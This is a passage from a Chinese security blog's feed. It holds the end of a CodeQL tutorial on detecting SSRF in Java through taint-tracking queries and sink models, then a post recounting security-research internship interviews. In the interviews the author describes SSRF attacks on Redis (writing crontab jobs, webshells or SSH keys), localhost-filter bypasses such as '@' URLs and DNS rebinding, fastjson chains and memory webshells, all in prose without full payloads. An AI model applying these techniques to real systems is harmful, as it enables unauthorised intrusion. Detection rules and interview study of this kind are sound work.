method.hasName(&quot;openConnection&quot;)</span><br><span class="line">             and</span><br><span class="line">             call.getMethod() = method and</span><br><span class="line">             sink.asExpr() = call.getArgument(0)</span><br><span class="line">             )</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>追踪 <code>url.openConnection()</code>，但这很明显是追踪不到的，因为 <code>url.openConnection()</code> 是不传参的。那么这一条链路用图来表示的话，断在了这里</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/brokenSSRF.png" class><p>那么中间断的地方我们要想办法接上，这就回到了前文提到过的 <code>isAdditionalTaintStep</code> 方法。从应用角度来说代码应该如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @id java/examples/vuldemo</span><br><span class="line"> * @name processBuilder-vul</span><br><span class="line"> * @description processBuilder-vul</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @problem.severity warning</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"> import java</span><br><span class="line"> import semmle.code.java.dataflow.FlowSources</span><br><span class="line"> import semmle.code.java.security.QueryInjection</span><br><span class="line"> import DataFlow::PathGraph</span><br><span class="line"> import semmle.code.java.security.RequestForgeryConfig</span><br><span class="line"> </span><br><span class="line"> class SSRFVulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">    SSRFVulConfig() &#123; this = &quot;SSRFVulConfig&quot; &#125;</span><br><span class="line">     </span><br><span class="line">     override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">         src instanceof RemoteFlowSource</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        sink instanceof RequestForgerySink</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> from SSRFVulConfig ssrfVulConfig, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line"> where ssrfVulConfig.hasFlowPath(source, sink)</span><br><span class="line"> select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><p>运行结果</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/SSRFResult.png" class><p>此处 import 了一个新的文件 <code>semmle.code.java.security.RequestForgeryConfig</code>，这里匹配了对应的规则，和之前的命令执行接口是一样的。可以深入看一下对应的实现。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/ssrfSinkRealize.png" class><h4 id="isSource"><a href="#isSource" class="headerlink" title="isSource"></a>isSource</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    source instanceof RemoteFlowSource and</span><br><span class="line">    // Exclude results of remote HTTP requests: fetching something else based on that result</span><br><span class="line">    // is no worse than following a redirect returned by the remote server, and typically</span><br><span class="line">    // we&#x27;re requesting a resource via https which we trust to only send us to safe URLs.</span><br><span class="line">    not source.asExpr().(MethodAccess).getCallee() instanceof UrlConnectionGetInputStreamMethod</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>RequestForgeryConfig.qll</code> 规则中的 Source 匹配 <code>RemoteFlowSource</code>，且限定了 <code>java.net.URLConnection.getInputStream()</code> 的输入不为漏洞。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/NotTypeUrlConnection.png" class><p>这里的原因是此处的 <code>getInputStream()</code> 的输入不一定是可控的。</p><h4 id="isSink"><a href="#isSink" class="headerlink" title="isSink"></a>isSink</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink) &#123; sink instanceof RequestForgerySink &#125;</span><br></pre></td></tr></table></figure><p>跟进 <code>RequestForgerySink</code></p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/RequestForgerySink.png" class><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/** A data flow sink for server-side request forgery (SSRF) vulnerabilities. */</span><br><span class="line">abstract class RequestForgerySink extends DataFlow::Node &#123; &#125;</span><br><span class="line"></span><br><span class="line">private class UrlOpenSinkAsRequestForgerySink extends RequestForgerySink &#123;</span><br><span class="line">  UrlOpenSinkAsRequestForgerySink() &#123; sinkNode(this, &quot;open-url&quot;) &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private class JdbcUrlSinkAsRequestForgerySink extends RequestForgerySink &#123;</span><br><span class="line">  JdbcUrlSinkAsRequestForgerySink() &#123; sinkNode(this, &quot;jdbc-url&quot;) &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个类都在构造函数里面调用了 <code>sinkNode()</code>，跟进去，对应的文件是 <code>java.dataflow.ExternalFlow.qll</code>。<br>关注到它的注释内容大致意思是在说</p><p><strong>仅供内部使用。这是一个实验API<br>提供用于处理指定的流模型的类和谓词<br>数据扩展和CSV格式</strong></p><p>那么这里的内容，一定是从某个 CSV 文件里面去读取的，这就被定义为 <code>ModelCsv</code> 我们可以简化代码定义 sink、source、flow step，并通过<code>kind</code>来使用它。</p><ul><li>它的格式有这么几种</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Source: (SourceModelCsv)</span><br><span class="line">package; type; subtypes; name; signature; ext; output; kind; provenance</span><br><span class="line"></span><br><span class="line">Sink: (SinkModelCsv)</span><br><span class="line">package; type; subtypes; name; signature; ext; input; kind; provenance</span><br><span class="line"></span><br><span class="line">Summaries: (SummaryModelCsv)</span><br><span class="line">package; type; subtypes; name; signature; ext; input; output; kind; provenance</span><br><span class="line"></span><br><span class="line">Neutrals:</span><br><span class="line">package; type; name; signature; provenan</span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/ExternalFlowDescription.png" class><p>每一个参数都代表一个含义，整体来说如下</p><p>package：包名<br>type：选择包中的某个类型<br>subtypes：布尔类型，指示是否跳转到子类<br>name：方法名<br>signature：签名<br>ext：类似于附加类<br>input：输入的位置<br>kind：当前 sink 的类型<br>provenance：来源验证</p><p>这么看的话比较抽象，下文会详细讲解 SSRF 漏洞中所对应的规则。</p><p>目前 CodeQL 官方还并未发布 SinkModelCsv 的一些官方规则，原因是此功能尚不稳定。使用需要开发者&#x2F;安全人员自己定义类，此类需继承 <code>xxxModelCsv</code> 即可应用。</p><p>sinkModelCsv 谓词数据如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">private predicate sinkModelCsv(string row) &#123;</span><br><span class="line">  row =</span><br><span class="line">    [</span><br><span class="line">      // Open URL</span><br><span class="line">      &quot;java.net;URL;false;openConnection;;;Argument[-1];open-url&quot;,</span><br><span class="line">      &quot;java.net;URL;false;openStream;;;Argument[-1];open-url&quot;,</span><br><span class="line">      &quot;java.net.http;HttpRequest;false;newBuilder;;;Argument[0];open-url&quot;,</span><br><span class="line">      &quot;java.net.http;HttpRequest$Builder;false;uri;;;Argument[0];open-url&quot;,</span><br><span class="line">      &quot;java.net;URLClassLoader;false;URLClassLoader;(URL[]);;Argument[0];open-url&quot;,</span><br><span class="line">      &quot;java.net;URLClassLoader;false;URLClassLoader;(URL[],ClassLoader);;Argument[0];open-url&quot;,</span><br><span class="line">      &quot;java.net;URLClassLoader;false;URLClassLoader;(URL[],ClassLoader,URLStreamHandlerFactory);;Argument[0];open-url&quot;,</span><br><span class="line">      &quot;java.net;URLClassLoader;false;URLClassLoader;(String,URL[],ClassLoader);;Argument[1];open-url&quot;,</span><br><span class="line">      &quot;java.net;URLClassLoader;false;URLClassLoader;(String,URL[],ClassLoader,URLStreamHandlerFactory);;Argument[1];open-url&quot;,</span><br><span class="line">      &quot;java.net;URLClassLoader;false;newInstance;;;Argument[0];open-url&quot;,</span><br><span class="line">      // Bean validation</span><br><span class="line">      &quot;javax.validation;ConstraintValidatorContext;true;buildConstraintViolationWithTemplate;;;Argument[0];bean-validation&quot;,</span><br><span class="line">      // Set hostname</span><br><span class="line">      &quot;javax.net.ssl;HttpsURLConnection;true;setDefaultHostnameVerifier;;;Argument[0];set-hostname-verifier&quot;,</span><br><span class="line">      &quot;javax.net.ssl;HttpsURLConnection;true;setHostnameVerifier;;;Argument[0];set-hostname-verifier&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果直接跑 <code>sinkNode()</code> 代码，结果如下</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/sinkNodeRunResult.png" class><p>也就是通过上述的 <code>sinkModuleCsv</code>，其匹配所有 open-url 类型的数据类型。</p><ul><li>但是在新版本的 CodeQL 当中是找不到这一个规则的，在搜索了一堆资料后发现在新版本中是这样的。</li></ul><h4 id="isAdditionalTaintStep"><a href="#isAdditionalTaintStep" class="headerlink" title="isAdditionalTaintStep"></a>isAdditionalTaintStep</h4><p>看一下它的规则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">predicate isAdditionalFlowStep(DataFlow::Node pred, DataFlow::Node succ) &#123;</span><br><span class="line">    any(RequestForgeryAdditionalTaintStep r).propagatesTaint(pred, succ)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">// 跟进 RequestForgeryAdditionalTaintStep</span><br><span class="line"></span><br><span class="line">class RequestForgeryAdditionalTaintStep extends Unit &#123;</span><br><span class="line">  /**</span><br><span class="line">   * Holds if the step from `pred` to `succ` should be considered a taint</span><br><span class="line">   * step for server-side request forgery.</span><br><span class="line">   */</span><br><span class="line">  abstract predicate propagatesTaint(DataFlow::Node pred, DataFlow::Node succ);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private class DefaultRequestForgeryAdditionalTaintStep extends RequestForgeryAdditionalTaintStep &#123;</span><br><span class="line">  override predicate propagatesTaint(DataFlow::Node pred, DataFlow::Node succ) &#123;</span><br><span class="line">    // propagate to a URI when its host is assigned to</span><br><span class="line">    exists(UriCreation c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)</span><br><span class="line">    or</span><br><span class="line">    // propagate to a URL when its host is assigned to</span><br><span class="line">    exists(UrlConstructorCall c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private class TypePropertiesRequestForgeryAdditionalTaintStep extends RequestForgeryAdditionalTaintStep</span><br><span class="line">&#123;</span><br><span class="line">  override predicate propagatesTaint(DataFlow::Node pred, DataFlow::Node succ) &#123;</span><br><span class="line">    exists(MethodAccess ma |</span><br><span class="line">      // Properties props = new Properties();</span><br><span class="line">      // props.setProperty(&quot;jdbcUrl&quot;, tainted);</span><br><span class="line">      // Propagate tainted value to the qualifier `props`</span><br><span class="line">      ma.getMethod() instanceof PropertiesSetPropertyMethod and</span><br><span class="line">      ma.getArgument(0).(CompileTimeConstantExpr).getStringValue() = &quot;jdbcUrl&quot; and</span><br><span class="line">      pred.asExpr() = ma.getArgument(1) and</span><br><span class="line">      succ.asExpr() = ma.getQualifier()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看注释是比较明确的，也就是通过 <code>isAdditionalFlowStep()</code>，将 <code>pred</code> 和 <code>succ</code> 两个点连起来，这里的连接方式是通过污点传递来实现的。具体的匹配方式很容易理解，跟进一下 <code>UriCreation</code> 和 <code>UrlConstructorCall</code> 即可</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;CodeQL · 真入门&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://drun1baby.github.io/categories/Java/"/>
    
    <category term="CodeQL" scheme="https://drun1baby.github.io/categories/CodeQL/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
    <category term="CodeQL" scheme="https://drun1baby.github.io/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>2023 春招安全研究岗位面经分享</title>
    <link href="https://drun1baby.github.io/2023/08/23/2023-%E6%98%A5%E6%8B%9B%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E5%B2%97%E4%BD%8D%E9%9D%A2%E7%BB%8F%E5%88%86%E4%BA%AB/"/>
    <id>https://drun1baby.github.io/2023/08/23/2023-%E6%98%A5%E6%8B%9B%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E5%B2%97%E4%BD%8D%E9%9D%A2%E7%BB%8F%E5%88%86%E4%BA%AB/</id>
    <published>2023-08-23T14:39:22.000Z</published>
    <updated>2023-12-13T07:34:44.194Z</updated>
    
    <content type="html"><![CDATA[<p>随手记录一下</p><span id="more"></span><h2 id="安恒卫兵实验室"><a href="#安恒卫兵实验室" class="headerlink" title="安恒卫兵实验室"></a>安恒卫兵实验室</h2><p>1、你的简历与你之前发过来的简历有什么变化吗？</p><p>2、说一说你研究过的东西，然后有什么产出</p><p>这里我说研究了 Weblogic、shiro，但是没产出，那边似乎比较失望。</p><p>3、最近出了 Weblogic 的一个新的洞，你有研究过吗？自己在研究的时候有没有思考过别人是怎么挖出来的洞。</p><p>人麻了，没复现漏洞过，然后也没思考过这个。。</p><p>4、你觉得挖什么样子的洞比较好呢？你一般是怎么开展研究的</p><p>我说看漏洞类型，但是无论如何你需要先去简单了解一下它的流程，如果一个组件的流程你不清楚，盲目的开始挖洞比较愚蠢，像盲人摸象。然后在了解过基础流程之后，如果是反序列化的洞，就用 codeql、tabby 这些东西去找漏洞。</p><p>不知道那边是什么想法，不过有一说一面我的时候感觉大部分时候都是吸气和叹气qaq</p><p>5、你学习安全是什么时候开始的呢，一路上的经历是怎么样的</p><p>就简单聊了聊</p><p>6、有没有什么让你感觉很自豪的项目</p><p>当时说了 golang 写 sqlmap</p><p>7、你是什么状况下去学习 golang 的呢？是出于什么考虑呢</p><p>似乎很多面试官都会问这个问题，还是和之前一样回答了一下。</p><p>8、为什么在连连只实习了一个月呢？都做了什么业务</p><p>xxx</p><p>9、能简单说说在连连做了什么渗透测试吗？</p><p>10、能说一说常见的 SQL 注入种类吗？自己有绕过过一些 SQL 注入的 waf 吗？</p><p>这里说了绕过安全狗，麻了，当时就想到很可能会问 HIDS 的相关内容，果不其然后面就问了</p><p>11、一般是怎么绕 waf 呢？具体说说</p><p>我说了先 fuzz，然后具体的 bypass 就根据可用字符来打，那边似乎很不满意</p><p>12、有遇到过语意型的 waf 吗？自己是怎么 bypass 的呢？</p><p>我这里真的有点麻，满脑子都是 HIDS 和阿里的产品，包括先知 ban waf</p><p>13、如果给到你一个1day，你要怎么样进行漏洞分析呢？</p><p>14、又问了我如果就是一个 SQL 注入的 1day，让你漏洞分析，你会怎么分析呢，比如是有些特定条件下的 SQL 注入，比如什么什么配置文件下，你会怎么分析呢？</p><p>15、那你这样分析流程不会很耗时间吗？如果ddl之前你还没有分析完漏洞呢？你会怎么办？</p><p>16、那如果还是分析不出来，你是不是要思考一下你的方法是不是有问题了</p><p>我: 嗯……应该是吧</p><p>17、那如果你的 1day 积累的很多都完不成呢</p><p>我说我可能会考虑问一下其他有过经验的师傅，多多取经。</p><p>我大致了解你的情况了，能说说 SSRF 怎么样才能最好的利用呢？</p><p>我说，SSRF 用的好的话是可以 rce 的，但是前提是你需要先探活。当然这里 rce 的方式有很多，比如配合文件上传 gopher 打。</p><p>18、那如果目前我们探活出来有个 redis 服务，你要怎么打呢</p><p>SSRF 打 redis 的本质就是仿 redis 命令，将其写入一些 shell。我答了最多的一般都是 crontab，还有写入 shell，就类似于文件包含的原理。其实还有写入 ssh 私钥。还有主从复制什么的。</p><p>19、能说一说 ssrf 的防御嘛</p><p>我说了加白，最常用的方法，后续又补充了说限制一些不必要的协议，像 gopher 这种完全没必要啊，还有就是不给回显，这样的话对方探活也探不出什么东西，可能就以为这里并不存在 ssrf，但还得是白名单牛逼</p><p>20、那如果在变量里面呢？你要怎么过滤</p><p>我感觉这里就是加个 filter，实现单一职责原则</p><p>21、那如果我这里限制了 127.0.0.1，限制了 127.0.0.2 ，那你要怎么 bypass 呢</p><p>我直接说了 dns rebinding，我说这种攻击非常可观。面试官问我还有没有其他的呢？我补充了 @ 符绕过，进制转换，句号替换.符号。</p><p>22、能展开讲讲 @ 符是这么绕过的吗</p><p>这里其实是和 url 协议是有关系的，因为我们本质的 url 协议是这样请求资源的<br>http∶&#x2F;&#x2F;url@ip，然后后面跟上请求的资源，比如 <a class="link" href="http://www.baidu.com@1.1.1.1,那么我们这里把后面/">http://www.baidu.com@1.1.1.1，那么我们这里把后面<i class="fas fa-external-link-alt"></i></a> @ 的内容修改成恶意的 127.0.0.1即可。</p><p>23、面试官又问，如果把这些各种符号都禁了呢，因为很多时候我们会过滤这些输入。</p><p>我说那就 dns rebinding 呗，面试官说 dns rebinding 的事儿到时候再说。然后答了进制转换，他说算一种，又答了 xip.io 与 xip.name<br>泛域名解析，无需配置，将自定义的任何域名解析到指定的 IP 地址。假设你的 IP 地址是 10.0.0.1，你只需使用 前缀域名+IP地址+xip.io 即可完成相应自定义域名解析。</p><p>24、关于内存马有了解嘛？可以简单讲讲有哪些内存马吗？</p><p>我说了我只搞了 Tomcat 型内存马，我知道还有 Agent 型内存马和 websocket 型，还有 upgrade 型内存马。</p><p>25、内存马的查杀了解过原理吗？</p><p>我麻了，我说看调用的所有的filters，看哪些 filters 是恶意的，是程序没有的</p><p>26、后面问了问实习薪资期望</p><blockquote><p>接下来就是反问环节</p></blockquote><h2 id="白帽汇安全研究面试"><a href="#白帽汇安全研究面试" class="headerlink" title="白帽汇安全研究面试"></a>白帽汇安全研究面试</h2><h3 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h3><p>1、自我介绍</p><p>2、讲一讲最近在做什么吧</p><p>3、说一说 Shiro 这个洞都了解多少</p><p>4、自己有没有独立挖出过 0day</p><p>5、weblogic 了解多少</p><p>说了一下复现了的漏洞，然后面试官让我说一说具体的一个漏洞</p><p>6、weblogic 的 T3 和 XMLDecoder 漏洞展开讲讲吧</p><p>7、fastjson 复现过多少漏洞，你研究的版本是多少</p><p>8、能简单说一说 Java 反序列化的流程吗？</p><p>9、讲讲 RMI 的通信原理以及为什么会存在漏洞</p><p>10、看到你还有在看 PHP 的东西，一般是研究哪种为主呢，PHP 还是 Java</p><p>11、说一说你做过的一些项目吧</p><p>12、写这个 Java 路线，你是出于什么考虑呢？</p><p>13、看到你审计过一些 CMS，自己从中有什么收获吗？</p><h3 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h3><p>二面主要是聊了聊一些挖洞的思想&#x2F;个人经历，很有聊天的感觉，个人忘记记录完全了。</p><h3 id="HR-面"><a href="#HR-面" class="headerlink" title="HR 面"></a>HR 面</h3><p>1、看到你的简历上写了有说网络安全协会，都做了协会哪些工作呢</p><p>2、预期薪资是多少呢，我说在北京差不多 330&#x2F;天吧</p><p>后面又说给实习生薪资一个月是 5500</p><p>3、有没有一段很难的时光</p><p>4、你是独生子女吗</p><p>5、最让你自豪的一件事是什么</p><p>6、在 CTF 上让你有很自豪的事情吗</p><p>7、有收到其他家的 offer 吗</p><p>8、目前多久能过来呢</p><h2 id="极氪安全研究"><a href="#极氪安全研究" class="headerlink" title="极氪安全研究"></a>极氪安全研究</h2><p>1、简单说一说你作为红队，在 hvv 期间会有怎样的视角</p><p>我说，这是不是就是 hvv 视角下的红队攻击。面试官说是的</p><p>然后就说了社工钓鱼、信息收集、外网打点、内网横移、还有就是通过信息泄露拿源码，再进行源码审计，再就是 0day、1day 的应用、恶意流量分析</p><p>2、听到你说了源码审计，简单说一下思路吧</p><p>就还是那一套 filter ——&gt; pom.xml ——&gt; 细的功能点 ——&gt; 调试</p><p>3、说一说如果 hvv 期间出了一个 fastjson 的 day，你需要怎么防护</p><p>给我特么问住了，面试官其实在这个过程中一直在向我往工具利用那方面引导。我说了加黑，然后加白这样的策略。</p><p>他又和我说，怎么样判断资产里面是否存在这个漏洞呢。我说用工具测，说如果你们有比较成熟的白盒扫描工具是可以的，但是我没用过。反正这个问题纠结了很久。。。。</p><p>4、说一说内网横移的思路吧</p><p>我说分 Windows 和 Linux，Linux 比较难横移；Windows 就还是那一套</p><p>5、说一说除了 web 服务之外还有服务值得注意</p><p>这个问题问的挺。。。隐晦</p><p>其实就是问有哪些端口，我就说了那些</p><p>6、说一说你用 python 做过的一些项目吧</p><p>简单聊了聊</p><p>7、有做过白盒代码审计的一些项目吗</p><p>没有</p><p>8、如果你挖掘 Java 反序列化的 0day，你会怎么挖掘呢</p><p>就还是那样</p><blockquote><p>下面是反问环节</p></blockquote><p>主要问了问他们的业务、转正、一般上班强度如何、部门地位如何、食堂</p><p>就这些</p><h2 id="墨云科技安全研究"><a href="#墨云科技安全研究" class="headerlink" title="墨云科技安全研究"></a>墨云科技安全研究</h2><p>总体上来说和白帽汇的面试很像，当时便没有记录，而且问的很急</p><h2 id="奇安信观星实验室"><a href="#奇安信观星实验室" class="headerlink" title="奇安信观星实验室"></a>奇安信观星实验室</h2><h3 id="一面-1"><a href="#一面-1" class="headerlink" title="一面"></a>一面</h3><p>1、先做个自我介绍吧</p><p>2、我看你有复现过一些 Java 反序列化的漏洞，简单讲一讲漏洞原理吧。</p><p>easy</p><p>3、在这些反序列化的链子里面，有什么比较共通的地方吗</p><p>我说了链首、链尾、sink 要求</p><p>4、你有审计 Java 代码的经验，可以简单说一说吗？</p><p>说了一些思路</p><p>5、我看你 CTF 打的很多，其中应该有很多 PHP 吧，然后你挖的 PHP 洞也挖了几个，简单讲讲让你印象深刻的洞吧。</p><p>说了一个 SQL 注入，一个 phar</p><p>6、我看你复现过 fastjson 系列的洞，说一说最新的那个 fastjson 1.2.80 的洞吧，就浅蓝挖的那个</p><p>日了。。。我没很好的复现过</p><p>7、那你说一说 fastjson 的一些漏洞原理和绕过思路吧</p><p>我说了一些，但是有一条通杀的 jdbc 没有很好的分析过，后悔。</p><p>8、PHP 反序列化的漏洞挖掘思路可以说一下吗？</p><p>这个不会</p><p>9、jpress 我看你有审计的校验，有自己搞出来一些前台 RCE 吗</p><p>无</p><p>10、简单聊一聊 Java 内存马吧，原理以及如何写入</p><p>后面就是反问环节，问了一下他们的业务，然后大概组织架构，转正情况</p><h3 id="二面-1"><a href="#二面-1" class="headerlink" title="二面"></a>二面</h3><p>说实话二面没有准备好，因为一些特殊原因</p><p>1、做个自我介绍吧，主要讲一讲自己研究哪个方向。</p><p>2、PHP 审计过哪些大型的 CMS 呢</p><p>我说了 TP，还有一些其他的自己审计的</p><p>3、TP 里面不是有个命令执行吗？可以说一说里面大概后利用是怎么利用的，比如现在目标站开启了 <code>disabled_function</code></p><p>我这里有点麻，本身 PHP 就不是很好，我说如果利用角度来说，蚁剑的插件就行，如果没有这个条件的话就手动写入 <code>.so</code> 文件</p><p>那你详细说一说怎么写进去…… 寄、我忘了具体利用手法</p><p>4、PHP 里面的 extract 变量覆盖这个问题，有在实际漏洞挖掘的时候遇到过吗</p><p>没有</p><p>5、面试官似乎还是很想问 PHP 的，问了 PHP 的另外一个问题，还是没怎么答出来。</p><p>又问了问 最近打的 CTF，主要是 ant 和 阿里云，让我讲讲印象深刻的题目，我都忘得差不多了。。</p><p>6、说一说 Java JDBC MySQL 反序列化这个漏洞吧</p><p>我说这只是给了一个入口，需要伪造 MySQL fake server</p><p>7、那你说一说怎么判断 MySQL jdbc 的版本吧</p><p>我说 wireshark 抓个包，内容应该会在里面</p><p>8、看你 Java CMS 审计过 jpress，当时是复现还是</p><p>我说了复现，然后让我聊一聊印象最深刻的一个洞</p><p>9、如果现在有个文件上传，但是只有 <code>Web-INF</code> 下的 <code>.jsp</code> 文件才会被渲染，你有什么思路</p><p>我说了 SSTI、crontab、sh、weblogic 的部署都可以</p><p>10、你有在大型攻防演练当中跟进过一些 VMware 类型的漏洞吗？展开聊聊</p><p>我说我只做过蓝队，然后 VMware 的话，最新的洞正在看。然后简单讲一讲，感觉面试官没有复现这个漏洞</p><p>11、听你说分析了 RocketMQ 的洞，简单聊聊吧</p><p>就简单聊了聊</p><p>12、那如果不出网呢？</p><p>。。。。我说这个单纯从这个漏洞的角度来说，其实是可以写入 crontab 的，但是实际打内存马，我还没有试过。</p><p>下面就是反问环节</p><h2 id="沥泉科技红队安全研究"><a href="#沥泉科技红队安全研究" class="headerlink" title="沥泉科技红队安全研究"></a>沥泉科技红队安全研究</h2><p>1、做个自我介绍吧</p><p>2、看你漏洞这块，Java，PHP，Python 都有了解是吗？简单说一说怎么审计 PHP 漏洞的吧。</p><p>说了用 Seay 扫一扫，然后对扫出来的重点去审计，黑白盒结合一起打</p><p>3、Seay 是很老的东西了，你有没有修改一下它的规则什么的</p><p>答：没有。。。寄</p><p>4、如果你没有修改过的话，那你怎么样才能挖出别人挖不出来的洞呢？</p><p>不会啊。。麻了</p><p>5、说一说了解的 Java 漏洞吧，像 fastjson、shiro 这些，就先说说 fastjson 吧，你对它了解多少。</p><p>这里我说了说 fastjson 最好用的两条链子，一条是 templatesImpl 的，另外一条是不出网的 BCEL。</p><p>6、简单说一说 fastjson 的 checkAutoType 吧</p><p>如果开启了就是先白名单过滤，再黑名单。</p><p>如果没开启就是会先黑名单，再白名单。</p><p>7、那关于 fastjson 的 parse 和 parseObject 呢？</p><p>parseObject：返回 fastjson.JSONObject 类</p><p>parse ：返回我们的类 User</p><p>一般来说 parseObject 的利用面更广</p><p>8、有学过哪些框架和组件呢？为什么要学他们</p><p>就简单说了说，不过我的回答好像让那边挺满意的</p><p>9、关于 Shiro 的漏洞，有了解吗？展开说说</p><p>说了 550，721 和权限绕过</p><p>10、说一说 721 的 Oracle Padding Attack 的原理</p><p>寄，没背过</p><p>11、你用 Python 写过什么工具吗</p><p>说了说自己写了爬虫，然后写了个网段扫描的工具。</p><p>12、说到 nmap，一般 nmap 扫描很慢的时候会怎么办呢？</p><p>这里应该是用 msscan 比较好</p><p>13、有了解过内网么？说一说 Kerberos 协议的流程吧，后面又问了 NTLM 协议的流程</p><p>寄</p><p>14、除了 NTLM Hash，还知道哪些 Hash 呢</p><p>寄</p><p>15、src 自己有在挖嘛，简单说一说信息收集的一些方法吧。</p><p>寄，后门 l3m0n 师傅说有十多种方法。。。</p><p>16、话说 fastjson 需要碰到高版本的 jdk8 的时候要怎么绕过呢</p><p>这个其实就是 jndi 打高版本 jdk 的思路</p><p>17、Java 设计模式了解多少呢</p><p>18、打 CTF 是跟着战队拿奖还是自己校队拿奖</p><p>19、内网渗透的流程都了解吗</p><p>20、我大致了解你的情况了，可以说一说你的规划预期吗</p><hr><p>接下来就是反问环节，主要是问了问他们到底是做什么业务的。</p><p>面我的是 l3m0n 师傅，很强</p><h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p>投的太晚了，金三银四，我是四月底投的，差不多五月初的样子，这个非常不利。</p><p>自己能力上还是有非常多的不足。</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>最终是入职了安恒，不过那地方待个两三个月就可以走了，差不多得了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;随手记录一下&lt;/p&gt;</summary>
    
    
    
    
